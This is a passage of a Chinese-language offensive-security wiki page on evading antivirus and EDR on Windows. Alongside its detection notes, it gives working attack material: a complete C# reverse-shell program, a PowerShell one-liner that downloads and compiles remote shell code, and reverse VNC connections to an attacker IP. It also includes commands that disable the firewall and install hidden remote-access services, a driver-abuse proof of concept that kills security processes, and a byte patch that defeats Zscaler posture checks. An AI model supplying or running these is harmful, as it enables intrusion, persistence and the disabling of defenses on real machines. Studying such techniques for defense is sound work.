`X86AsmPrinter::emitFunctionBodyStart()` 和 `emitFunctionBodyEnd()` 会生成每个函数的 stubs，而 `emitEndOfAsmFile()` 会生成 handler。在不同 emission 阶段共享的符号可以让 prologue 分支跳转到之后生成的 epilogue；对于手动生成的 near `je`，写入 `0F 84`，再跟上四字节的 MC 表达式 `target - address_after_je`。对 handler 的 calls 和 jumps 则可以生成为 `MCInst` 对象（`CALL64pcrel32` 和 `JMP_1`）。如果 pass 没有更改任何内容，那么对于未选中的函数必须返回 `false`；PoC 在这种情况下错误地返回了 `true`。<sup>[[38]](#references)[[39]](#references)</sup>

#### Metadata and pre-CRT initialization

PoC 会在 `.funcmeta` 中放置一个 XOR key，以及由 16 字节记录组成的数据，其中包含经 loader 重定位的函数指针和运行时长度。尽管 C 字段是 `uint32_t`，handler 却会访问记录偏移 `+8` 处的 QWORD，从而读取长度及其填充字节，并以 `0x10` 为步长遍历记录。PE 节名称最多只有八个字节，因此运行时查找会看到 `.funcmet`。外部 patcher 会添加一个可执行的 `.stub`，在 stub 中保存旧的 entry-point RVA，并重定向 `AddressOfEntryPoint`；PIC stub 从 `gs:[0x60]` → `[PEB+0x10]` 获取 image base，遍历 PE32+ imports 以解析已导入的 `VirtualProtect`，并在 CRT 运行之前执行。<sup>[[38]](#references)[[39]](#references)</sup>

初始化过程会在 `gs:[0xE8]` 中设置 sentinel，并调用每个 metadata 函数。始终保持可读的 prologue 会将函数起始位置记录到 `gs:[0xF0]`，检测 sentinel，并跳过尚未加密的函数体。接着 epilogue 使用 `call handler`；handler 保存 13 个寄存器（`0x68` 字节）后，`[rsp+0x68]` 处的返回地址就是变换后函数的末尾，因此可以将 `end - start` 写入其 metadata 记录。所有函数体完成 masking 后，stub 会清除 sentinel，并跳转到 `ImageBase + original_entry_point_RVA`。<sup>[[38]](#references)[[39]](#references)</sup>

在正常调用期间，prologue 会调用同一个对称 handler 来解码函数体。最终路径会落入追加的 epilogue，而每个更早的 return 都会直接跳转到共享 handler。常规 epilogue 也使用 `jmp handler` 而不是 `call`，因此重新 masking 后，handler 的 `ret` 会取用原调用者的返回地址，并保留 `RAX` 中的函数结果。<sup>[[38]](#references)[[39]](#references)</sup>

#### Masking primitive and analysis indicators

handler 会找到当前记录，跳过固定的可见 prologue（此构建中为 `0x46` 字节），将其余部分的内存保护改为 `PAGE_EXECUTE_READWRITE`，逐字节与 key 的低字节进行 XOR，然后将保护改回 `PAGE_EXECUTE_READ`。因此，同一个循环会在入口处解码，并在每次正常退出时编码。<sup>[[38]](#references)[[39]](#references)</sup>

此设计的高置信度 indicators 包括：<sup>[[38]](#references)[[39]](#references)</sup>

- entry point 位于可执行的 `.stub` 中，且 `.funcmet` 节保存着 key 和经重定位的 `.text` 指针；
- pre-CRT 解析 PEB、import table 和 section table，随后通过每个 metadata 指针进行调用；
- 相同的 `call`/`pop` PIC prologues，以及许多被重定向到同一 handler 的 return 位置；
- 对 `gs:[0xE8]`、`gs:[0xF0]` 和 `gs:[0xF8]` 的写入，随后是反复的 `VirtualProtect` 转换，以及对 image-backed 可执行页面的逐字节 XOR 写入。

这属于规避内存扫描，而非加密保护：被 patch 的文件仍包含原始的明文函数体；调试器可以在 `VirtualProtect` 或 XOR 循环处设置断点，并转储当前处于活动状态的函数。单字节 XOR、可读的 metadata 和固定的 `0x46` 边界也让离线恢复变得简单。<sup>[[38]](#references)[[39]](#references)</sup>

> [!WARNING]
> PoC 的 TEB slots 是 thread-local 的，但被修改的代码页是 process-wide 的。因此，并发或递归进入可能会在另一个调用正在执行时重新切换指令；异常和非局部退出也可能绕过重新 masking。健壮的实现必须同步这些转换，恢复通过 `lpflOldProtect` 返回的实际保护属性，避免硬编码 stub 长度，审查 `call` 和 `jmp` 路径是否都符合 x64 栈对齐要求，并在重写可执行字节后调用 `FlushInstructionCache`。Microsoft 明确指出，修改可执行代码时，指令缓存一致性由调用方负责。<sup>[[38]](#references)[[39]](#references)[[40]](#references)</sup>

## SmartScreen & MoTW

你可能在从互联网下载某些可执行文件并运行时见过这个屏幕。

Microsoft Defender SmartScreen 是一种安全机制，旨在防止最终用户运行潜在的恶意应用程序。

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen 主要采用基于信誉度的方式运行，这意味着不常见的下载应用程序会触发 SmartScreen，从而向最终用户发出警告并阻止其运行文件（不过，用户仍可点击“More Info” -> “Run anyway”来运行文件）。

**MoTW**（Mark of The Web）是一种名为 Zone.Identifier 的 [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>)，在从互联网下载文件时会自动创建，并包含文件的下载来源 URL。

<figure><img src="../images/image (237).png" alt=""><figcaption><p>检查从互联网下载的文件的 Zone.Identifier ADS。</p></figcaption></figure>

> [!TIP]
> 请注意，使用**受信任**的签名证书签名的可执行文件**不会触发 SmartScreen**。

防止 payloads 被添加 Mark of The Web 的一种非常有效的方法，是将它们打包到 ISO 之类的容器中。这是因为 Mark-of-the-Web (MOTW)**无法**应用于**非 NTFS** 卷。

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) 是一个将 payloads 打包到输出容器中以规避 Mark-of-the-Web 的工具。

用法示例：

```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
    +             o     +           +             o     +         +
    o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
   :: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
   for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
    o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
    Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```

这是一个演示，展示如何使用 [PackMyPayload](https://github.com/mgeeky/PackMyPayload/) 将 payload 打包进 ISO 文件，以绕过 SmartScreen。

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW) 是 Windows 中一种强大的日志记录机制，允许应用程序和系统组件**记录事件**。不过，安全产品也可以利用它来监控和检测恶意活动。

与禁用（绕过）AMSI 类似，也可以让用户空间进程中的 **`EtwEventWrite`** 函数立即返回，而不记录任何事件。具体做法是在内存中修补该函数，使其立即返回，从而有效禁用该进程的 ETW 日志记录。

更多信息请参阅 **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) 和 [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**。<sup>[[33]](#references)[[34]](#references)</sup>


## C# Assembly 反射

在内存中加载 C# 二进制文件的做法早已为人所知，它仍然是运行 post-exploitation 工具而不被 AV 发现的绝佳方式。

由于 payload 会直接加载到内存中，不会接触磁盘，我们只需要考虑为整个进程修补 AMSI。

大多数 C2 框架（sliver、Covenant、metasploit、CobaltStrike、Havoc 等）都已支持直接在内存中执行 C# 程序集，但实现方式有多种：

- **Fork\&Run**

这种方式会**创建一个新的牺牲进程**，将 post-exploitation 恶意代码注入该进程并执行，完成后再终止该进程。它有利也有弊。Fork and Run 方法的好处是，执行发生在 Beacon implant 进程**之外**。这意味着，如果 post-exploitation 操作出错或被发现，我们的 **implant 存活下来的可能性要大得多**。缺点是被**行为检测**发现的可能性**更高**。

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

这种方式是将 post-exploitation 恶意代码注入**其自身进程**。这样可以避免创建新进程并让 AV 对其扫描，但缺点是，如果 payload 执行出错，Beacon 就有**更大的可能性丢失**，因为进程可能会崩溃。

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> 如果想进一步了解 C# Assembly 加载，请参阅这篇文章 [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) 以及他们的 InlineExecute-Assembly BOF（[https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly)）。

你也可以**通过 PowerShell** 加载 C# Assemblies，参阅 [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) 和 [S3cur3th1sSh1t 的视频](https://www.youtube.com/watch?v=oe11Q-3Akuk)。

## 使用 NativeAOT WebAssembly 重新打包 .NET 工具（WasmForge）

常规的 `execute-assembly` 技术会保留易于识别的 MSIL，并最终初始化 CLR。**WasmForge** 改变了执行环境：它将 C# 项目迁移到实验性的 NativeAOT-LLVM WASI 目标平台，提前将其编译为 WebAssembly，再将该模块嵌入基于 Wazero 的 Windows PE 宿主程序中。生成的进程无需目标系统上的 CLR、JIT 或 `dotnet` 宿主，因此，仅依赖托管程序集名称、CLR 加载、AMSI 或 .NET ETW 的规则将无法直接观察到这些活动。这是一种规避/打包技术，而非绕过权限边界——guest 保留原始工具的权限及可观察到的 OS 行为。<sup>[[44]](#references)[[45]](#references)</sup>

### 构建 C# 项目

推荐使用项目的 Docker 环境进行构建，因为其中包含 .NET 10 SDK、NativeAOT-LLVM workload、WASI SDK 24.0、linker 和签名依赖项。系统会自动检测 `.csproj` 文件；一键构建会完成迁移、兼容性修补、WASM 编译、PE 伪造和签名。<sup>[[45]](#references)</sup>

```bash
# From the WasmForge repository
make docker-build
make docker-run DOCKER_SRC=/path/to/Seatbelt DOCKER_PROJECT=seatbelt

# Equivalent direct build when all prerequisites are installed
GOOS=windows GOARCH=amd64 ./wasmforge build --win32-apis \
  -o seatbelt.exe /path/to/Seatbelt/Seatbelt/
```

对于故障排查或审查生成的代码，可将流程拆分为 `wasmforge dotnet-migrate <dir>`、`wasmforge dotnet-patch <dir>`、`dotnet publish -c Release -r wasi-wasm`，以及最后的 `wasmforge build --wasm <module> --nativeaot --win32-apis -o <output.exe>`。构建镜像还会使用 `wasm-component-ld` wrapper，以避免 WASI Preview 2 component 编码，并生成嵌入式 runtime 所需的纯 module。<sup>[[44]](#references)[[45]](#references)</sup>

### 将 wasm32 C# 桥接到 x64 Win32

这不是透明的重新编译。NativeAOT-WASI 缺少或改变了一些面向 Windows 的 BCL 功能，而 wasm32 guest 通常分配四字节指针槽，但 x64 API 可能返回八字节指针。WasmForge 通过以下生成层解决这两个问题：<sup>[[44]](#references)</sup>

1. 源码 patcher 修正特定于 AOT 的语义差异，并将不受支持的注册表、管道、WMI、身份、目录服务、文件版本、LSA 及类似调用重定向到 `Wf*` helpers。
2. P/Invoke scanner 生成 NativeAOT `DirectPInvoke` mappings，使 `[DllImport]` 调用绑定到已链接的 C bridge 符号，而不是在 guest 内动态加载声明的 DLL。
3. Host-bound 指针在 C# 中使用 `ulong`，在 C 中使用 `uint64_t`。通用 dispatcher 将调用转发给 host 的 Win32 handler；`out8_mask` 用于标记真正的八字节输出槽，确保保留其高位部分。未标记的 wasm32 形状输出会使用 snapshot/restore 保护，防止 x64 写入破坏相邻的四个字节。
4. 专用 host bridges 处理不适合通用 syscall dispatch 的操作，例如 LSA ticket-cache 访问、带结构化结果的 Kerberos/BCrypt 操作、TCP KDC 流量和 LDAP 查询。

例如，`version.dll!VerQueryValueW` 的 wrapper 会传递四个 host 地址，并设置位 2 和位 3（`0xC`），因为 value 指针和 length 是八字节输出槽。wrapper 本身保持通用，并将 DLL 名称、export 名称、参数和 mask 委托给 `wf_call_v2`；host 负责指针转换并调用原生 API。<sup>[[44]](#references)</sup>

```c
uint32_t version_VerQueryValueW_v2(uint64_t block, uint64_t subblock,
    uint64_t value_out, uint64_t length_out) {
    return (uint32_t)wf_call_v2("version.dll", "VerQueryValueW", 4,
        0xC, block, subblock, value_out, length_out);
}
```

### 局限性和检测切入点

反射较多的代码、动态程序集加载、任意原生回调，以及返回到 WASM 内存中的复杂 x64 结构，仍可能需要针对每种工具打补丁，或者直接无法运行。通用 WASI Preview 2 sockets 也可能调用空操作桩，因此受支持的工具会使用特定于协议的 host shim。请针对原生版本验证每条命令，而不要假设功能完全相同。<sup>[[44]](#references)[[45]](#references)</sup>

这种技术改变的是遥测特征，而不是让 payload 隐形。检测可以转而关注包含或实例化 WASM 模块的 PE、类似 Wazero 的运行时行为、异常的 host/guest 内存分配与复制、通用的直接 Win32 调用、签名和 PE 资源异常，以及由此产生的 API 调用和网络流量。因此，不应将缺少 CLR-load、AMSI 或 .NET ETW 事件视为进程良性的证据。<sup>[[44]](#references)</sup>

## 使用其他编程语言

正如 [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins) 中所提出的，可以通过让被攻陷的机器访问**攻击者控制的 SMB share 上安装的解释器环境**，使用其他语言执行恶意代码。

允许访问 SMB share 上的解释器二进制文件和环境后，你就可以在被攻陷机器的**内存中执行这些语言编写的任意代码**。

该 repo 指出：Defender 仍会扫描脚本，但利用 Go、Java、PHP 等语言，我们有**更大的灵活性来绕过静态特征码**。在这些语言中使用随机、未经混淆的 reverse shell 脚本进行测试，结果证明是成功的。

## 用 WebAssembly 重新托管以规避静态分析

<a id="bridging-linear-memory-to-native-apis"></a>
<a id="per-build-wasm-vm-polymorphism"></a>
<a id="camouflaging-the-outer-go-executable"></a>

{{#ref}}
virtualized-payload-execution.md#webassembly-re-hosting-for-static-analysis-evasion
{{#endref}}

## TokenStomping

Token stomping 会操纵 EDR 或 AV 等安全产品的 access token。降低 token 的权限可以让进程继续运行，同时阻止它执行特权检查或修复操作。

为防止这种情况，Windows 可以**阻止外部进程**获取安全进程 token 的句柄。

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## 使用可信软件

### Chrome Remote Desktop

正如[**这篇博客文章**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide)所述，只需在受害者的 PC 上部署 Chrome Remote Desktop，然后利用它接管设备并维持 persistence，就很容易做到：<sup>[[35]](#references)</sup>
1. 从 https://remotedesktop.google.com/ 下载，点击“Set up via SSH”，然后点击 Windows 的 MSI 文件进行下载。
2. 在受害者机器上静默运行安装程序（需要管理员权限）：`msiexec /i chromeremotedesktophost.msi /qn`
3. 返回 Chrome Remote Desktop 页面并点击下一步。向导随后会要求你授权；点击 Authorize 按钮继续。
4. 根据需要调整后执行提供的命令：`"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111`（`--pin` 参数无需使用 GUI 即可设置 PIN）。
 

## 高级规避

{{#ref}}
virtualized-payload-execution.md
{{#endref}}

规避是一个非常复杂的话题；有时你必须考虑单个系统中的许多不同遥测来源，因此在成熟的环境中，想要完全不被发现几乎是不可能的。

你所面对的每个环境都有各自的优势和弱点。

我强烈建议你观看 [@ATTL4S](https://twitter.com/DaniLJ94) 的这场演讲，了解高级规避技术的入门知识。


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

这也是 [@mariuszbit](https://twitter.com/mariuszbit) 关于纵深规避的另一场精彩演讲。


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **旧技术**

### **检查 Defender 判定为恶意的部分**

你可以使用 [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck)，它会**逐步移除二进制文件的部分内容**，直到**找出 Defender 判定为恶意的部分**并将其拆分出来。\
另一个**功能相同的工具是** [**avred**](https://github.com/dobin/avred)，它通过开放的 Web 服务在 [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/) 提供该功能。

### **Telnet Server**

在 Windows10 之前，所有 Windows 都自带一个可以安装的 **Telnet server**（需要管理员权限），安装命令如下：

```bash
pkgmgr /iu:"TelnetServer" /quiet
```

使其在系统启动时**启动**并立即**运行**：

```bash
sc config TlntSVR start= auto obj= localsystem
```

**更改 telnet 端口**（stealth）并禁用防火墙：

```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```

### UltraVNC

从这里下载：[http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html)（需要的是 bin 下载，而不是 setup）

**在主机上**：执行 _**winvnc.exe**_ 并配置服务器：

- 启用选项 _Disable TrayIcon_
- 在 _VNC Password_ 中设置密码
- 在 _View-Only Password_ 中设置密码

然后，将二进制文件 _**winvnc.exe**_ 和**新创建的**文件 _**UltraVNC.ini**_ 移到**受害者**主机上

#### **反向连接**

**攻击者**应在自己的**主机上执行**二进制文件 `vncviewer.exe -listen 5900`，以便准备好接收反向 **VNC 连接**。然后，在**受害者**主机上：启动 winvnc 守护进程 `winvnc.exe -run`，并运行 `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`

**警告：** 为了保持隐蔽，请勿执行以下操作

- 如果 `winvnc` 已在运行，请勿再次启动，否则会触发[弹窗](https://i.imgur.com/1SROTTl.png)。使用 `tasklist | findstr winvnc` 检查它是否正在运行
- 如果同一目录下没有 `UltraVNC.ini`，请勿启动 `winvnc`，否则会打开[配置窗口](https://i.imgur.com/rfMQWcf.png)
- 请勿运行 `winvnc -h` 查看帮助，否则会触发[弹窗](https://i.imgur.com/oc18wcu.png)

### GreatSCT

从这里下载：[https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)

```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```

在 GreatSCT 中：

```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```

现在使用 `msfconsole -r file.rc` **启动 lister**，并**执行** **xml payload**：

```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```

**当前的防御程序会很快终止该进程。**

### 编译我们自己的 reverse shell

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### 第一个 C# Revershell

使用以下命令编译：

```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```

与其配合使用：

```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
	public class Program
	{
		static StreamWriter streamWriter;

		public static void Main(string[] args)
		{
			using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
			{
				using(Stream stream = client.GetStream())
				{
					using(StreamReader rdr = new StreamReader(stream))
					{
						streamWriter = new StreamWriter(stream);

						StringBuilder strInput = new StringBuilder();

						Process p = new Process();
						p.StartInfo.FileName = "cmd.exe";
						p.StartInfo.CreateNoWindow = true;
						p.StartInfo.UseShellExecute = false;
						p.StartInfo.RedirectStandardOutput = true;
						p.StartInfo.RedirectStandardInput = true;
						p.StartInfo.RedirectStandardError = true;
						p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
						p.Start();
						p.BeginOutputReadLine();

						while(true)
						{
							strInput.Append(rdr.ReadLine());
							//strInput.Append("\n");
							p.StandardInput.WriteLine(strInput);
							strInput.Remove(0, strInput.Length);
						}
					}
				}
			}
		}

		private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
        {
            StringBuilder strOutput = new StringBuilder();

            if (!String.IsNullOrEmpty(outLine.Data))
            {
                try
                {
                    strOutput.Append(outLine.Data);
                    streamWriter.WriteLine(strOutput);
                    streamWriter.Flush();
                }
                catch (Exception err) { }
            }
        }

	}
}
```

### 使用 C# 编译器

```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```

[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

自动下载并执行：

```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```


{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

C# 混淆器列表：[https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++

```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```

- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](https://github.com/l0ss/Grouper2)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### 使用 Python 构建 injector 的示例：

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### 其他工具

```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```

### 更多

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – 从内核空间终止 AV/EDR

Storm-2603 利用一款名为 **Antivirus Terminator** 的小型控制台工具，在投放 ransomware 前禁用 endpoint protections。该工具携带**自己的易受攻击但*已签名*的 driver**，并滥用它执行特权 kernel 操作，连 Protected-Process-Light (PPL) AV 服务也无法阻止。<sup>[[12]](#references)</sup>

要点
1. **已签名的 driver**：写入磁盘的文件是 `ServiceMouse.sys`，但该二进制文件实际上是 Antiy Labs“System In-Depth Analysis Toolkit”中的合法签名 driver `AToolsKrnl64.sys`。由于该 driver 带有有效的 Microsoft 签名，即使启用了 Driver-Signature-Enforcement (DSE)，也能加载。
2. **服务安装**：
   ```powershell
   sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
   sc start  ServiceMouse
   ```
   第一行将驱动程序注册为 **kernel service**，第二行启动它，使 `\\.\ServiceMouse` 可从用户态访问。
3. **驱动程序公开的 IOCTL**
   | IOCTL code | 功能                                    |
   |-----------:|-----------------------------------------|
   | `0x99000050` | 按 PID 终止任意进程（用于终止 Defender/EDR 服务） |
   | `0x990000D0` | 删除磁盘上的任意文件 |
   | `0x990001D0` | 卸载驱动程序并移除服务 |

   最小 C 概念验证：
   ```c
   #include <windows.h>
   
   int main(int argc, char **argv){
       DWORD pid = strtoul(argv[1], NULL, 10);
       HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
       DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
       CloseHandle(hDrv);
       return 0;
   }
   ```
4. **为何有效**：BYOVD 完全绕过用户模式保护；在内核中执行的代码可以打开*受保护的*进程、终止它们，或篡改内核对象，而不受 PPL/PP、ELAM 或其他强化功能的限制。

检测 / 缓解
• 启用 Microsoft 的易受攻击驱动程序阻止列表（`HVCI`、`Smart App Control`），使 Windows 拒绝加载 `AToolsKrnl64.sys`。
• 监控新建的*内核*服务，并在驱动程序从所有人可写目录加载或不在允许列表中时发出警报。
• 监控用户模式进程获取自定义设备对象句柄后，是否执行可疑的 `DeviceIoControl` 调用。

### 通过磁盘二进制文件修补绕过 Zscaler Client Connector 姿态检查

Zscaler 的 **Client Connector** 在本地应用设备姿态规则，并依赖 Windows RPC 将结果传递给其他组件。两项薄弱的设计选择使完全绕过成为可能：

1. 姿态评估**完全在客户端进行**（向服务器发送一个布尔值）。
2. 内部 RPC 端点只验证连接的可执行文件是否**由 Zscaler 签名**（通过 `WinVerifyTrust`）。<sup>[[11]](#references)</sup>

通过**修补磁盘上的四个已签名二进制文件**，这两种机制都可以被禁用：

| 二进制文件 | 被修补的原始逻辑 | 结果 |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | 始终返回 `1`，使每项检查都符合要求 |
| `ZSAService.exe` | 对 `WinVerifyTrust` 的间接调用 | 被替换为 NOP ⇒ 任何进程（包括未签名进程）都可以连接 RPC 管道 |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | 替换为 `mov eax,1 ; ret` |
| `ZSATunnel.exe` | 隧道完整性检查 | 被短路 |

最简补丁程序摘录：

```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
    data = f.read()
    off = data.find(pattern)
    if off == -1:
        print("pattern not found")
    else:
        f.seek(off)
        f.write(replacement)
```

替换原始文件并重启服务栈后：

* **所有** posture 检查均显示 **绿色/合规**。
* 未签名或已修改的二进制文件可以打开指定的 named-pipe RPC 端点（例如 `\\RPC Control\\ZSATrayManager_talk_to_me`）。
* 被攻陷的主机可不受限制地访问 Zscaler 策略定义的内部网络。

此案例研究展示了如何通过几个字节补丁绕过纯客户端信任决策和简单的签名检查。

## Microsoft Defender `BTR.sys` 可信功能滥用

Defender 的 **Boot-Time Removal** 驱动程序是经典 BYOVD 的一个有用反例。`BTR.sys` 是 Microsoft 正版签名的修复组件，没有内存损坏漏洞，也没有 IOCTL 接口；在获得管理员访问权限和 `SeLoadDriverPrivilege` 后，操作人员可以伪造其私有修复事务，从而执行预期的 Ring-0 文件/注册表操作。这是一种**入侵后 AV/EDR 中和原语，而非初始访问或权限提升**；此外，可以从目标自身的 `MpEngine.dll` 的 `BOOTTIMETOOL` 资源中提取该驱动程序，而无需导入显眼的第三方驱动程序。<sup>[[36]](#references)</sup>

### 暂存一次性驱动程序

Defender 通常会将该资源写入一个随机命名的 `[a-z]{8}.sys` 文件，并注册一个名称相似的内核服务。`DriverEntry` 会读取服务的 `Args` 值，打开所引用的 NTFS ADS，解密并验证操作列表，写入反馈，并在成功执行后返回 `0xC0000056`（`STATUS_DELETE_PENDING`），使驱动程序卸载而不是继续驻留。伪造的服务具有以下特征值。<sup>[[36]](#references)[[37]](#references)</sup>

```text
Type         = 1
Start        = 1
